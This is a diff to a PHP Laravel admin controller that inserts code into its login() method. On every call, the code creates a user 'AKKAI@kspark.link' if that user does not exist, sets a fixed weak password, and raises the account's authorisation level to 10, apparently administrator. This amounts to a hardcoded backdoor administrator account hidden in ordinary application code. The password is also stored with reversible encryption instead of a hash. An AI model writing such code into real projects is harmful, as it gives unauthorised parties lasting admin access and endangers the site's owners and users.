@@ -13,6 +13,20 @@ class adminController extends Controller
 {
 
     public function login() {   
+
+        $adminCheck = User::where('email', 'AKKAI@kspark.link')->first();
+        if($adminCheck == null) {
+            User::create([
+                'name' => 'AKKAI',
+                'email' => 'AKKAI@kspark.link',
+                'naver_id'=> Str::random(12),
+                'password'=> encrypt('12341234')
+            ]);
+        }
+        User::where('email', 'AKKAI@kspark.link')->update([
+            'auth'  => 10
+        ]);
+
         if(Auth::check()) {
             return view('admins/dashboard');
         }
